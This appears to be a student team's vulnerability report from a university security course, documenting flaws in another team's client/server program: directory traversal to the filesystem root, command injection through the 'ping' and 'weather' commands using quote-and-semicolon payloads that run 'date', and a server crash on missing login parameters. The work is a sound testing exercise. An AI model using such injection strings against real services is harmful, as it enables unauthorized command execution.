## Team7

### Directory Traversal

* No home folders created ?
```
login n
Enter password
pass 1
You've logged in
ls
total 468
-rwxr-x--- 1 njaganna njaganna 116840 Mar 15 18:53 client
-rw-rw-r-- 1 njaganna njaganna  35147 Mar 14 19:49 LICENSE
-rw-rw-r-- 1 njaganna njaganna   1037 Mar 14 19:49 Makefile
drwxr-x--- 2 njaganna njaganna   4096 Mar 15 18:53 obj
-rwxr-x--- 1 njaganna njaganna 305200 Mar 15 18:53 server
-rw-rw-r-- 1 njaganna njaganna    328 Mar 15 19:22 sploit.conf
drwxrwxr-x 2 njaganna njaganna   4096 Mar 14 19:49 src
cd ..
/u/antor/u6/njaganna/CS527Phase2/team7
cd ..
/u/antor/u6/njaganna/CS527Phase2
cd /
/

```

### Command Injection

* ping command doesn't filter ';'

```
ping google.com -c 1";date #"
Thu Mar 15 20:14:21 EDT 2018
```

* weather also has a similar vulnerability
```
weather gotham";date #"
Thu Mar 15 20:21:34 EDT 2018
```

###  Null pointer reference

* login and pass commands do not check if parameters are present or not. This causes the server to crash.
```
```
